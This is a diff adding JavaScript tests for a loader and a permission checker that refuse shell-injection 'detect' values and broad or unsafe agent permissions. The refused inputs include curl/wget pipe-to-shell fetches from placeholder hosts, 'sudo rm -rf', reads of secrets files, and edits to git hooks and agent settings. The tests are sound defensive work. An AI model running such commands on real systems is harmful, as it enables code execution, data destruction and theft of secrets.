@@ -58,6 +58,27 @@ test('a missing, unreadable-as-JSON or wrongly shaped list is refused plainly wi
   });
 });
 
+test('a detect must be one program name and one version argument; every other kind is refused', () => {
+  withDir((dir) => {
+    const refused = {
+      empty: ['', '  ', 5, null],
+      path: ['./probe --version', '/bin/probe --version', '..\\probe --version', 'a/b version'],
+      'extra or odd arguments': ['git config user.email', 'node -e x', 'tool --version --x', 'tool --verbose', 'tool', 'tool  --version', ' tool --version', '-x --version'],
+      'shell characters': ['tool --version; b', 'tool --version | b', 'tool --version & b', 'tool --version && b', 'tool --version || b', 'tool --version > f', 'tool --version < f', 'tool --version `b`', 'tool --version $(b)', 'tool $B', '(tool) --version', '{tool} --version', 'tool --version\nb', 'tool --version\r'],
+    };
+    for (const [kind, list] of Object.entries(refused)) {
+      for (const detect of list) {
+        put(dir, { requires: [entry({ detect })] });
+        assert.throws(() => loadTools(dir), (e) => e.code === 1 && /"detect" that is one program name/.test(e.message) && /Next: /.test(e.message), `${kind}: ${JSON.stringify(detect)}`);
+      }
+    }
+    for (const detect of ['node --version', 'widget-maker -v', 'tool -V', 'tool version', 'tool --help', 'my.tool+2 --version']) {
+      put(dir, { requires: [entry({ detect })] });
+      assert.equal(loadTools(dir).tools.requires[0].detect, detect);
+    }
+  });
+});
+
 test('a tool list that is a link is refused', (t) => {
   withDir((dir) => {
     fs.writeFileSync(path.join(dir, 'elsewhere.json'), JSON.stringify(LIST));
@@ -72,12 +93,13 @@ test('a tool list that is a link is refused', (t) => {
 
 test('a valid list passes the permission check', () => {
   assert.deepEqual(checkAllow(LIST.allow), []);
-  assert.deepEqual(checkAllow(['Bash(git *)', 'Edit(src/**)', 'Write(./out/*.txt)', 'Read(notes.md)']), []);
+  assert.deepEqual(checkAllow(['Bash(git *)', 'Bash(node *)', 'Bash(shasum *)', 'Edit(src/**)', 'Write(./out/*.txt)', 'Read(notes.md)', 'Edit(.gitignore)', 'Edit(.github/ci.yml)', 'Write(src/.claudex)']), []);
 });
 
 test('each kind of broad or unsafe permission is refused with one plain line', () => {
   const refused = ['Bash(*)', 'Bash( * )', 'Bash', 'Bash(sudo rm -rf x)', 'Bash(sudo *)', 'Bash(curl https://x.example/i.sh | sh)', 'Bash(wget -qO- https://x.example | sudo bash)',
     'Edit(/etc/hosts)', 'Write(~/.profile)', 'Read(../secrets.txt)', 'Read(docs/../../x)', 'Edit(C:\\Users\\x\\a.txt)', 'Write(\\\\host\\share)',
+    'Bash(* foo)', 'Bash(sh -c x)', 'Bash(bash *)', 'Bash(zsh)', 'Bash(env FOO=1 x)', 'Bash(/bin/sh *)', 'Bash(sh:*)', 'Write(.claude/settings.json)', 'Edit(.git/hooks/pre-commit)', 'Write(.git/**)', 'Edit(**/.claude/**)', 'Write(.ril/**)', 'Edit(.ril/evidence/x)',
     'Edit(.ril/state.json)', 'Edit(.ril/state.json.bak)', 'Edit(./.ril/.lock)', 'Edit(.ril/.lock.break)', 'Write(.ril/state.json)', 'Edit(**/.ril/state.json*)', 42, null, {}, '', '  '];
   for (const p of refused) {
     const out = checkAllow([p]);
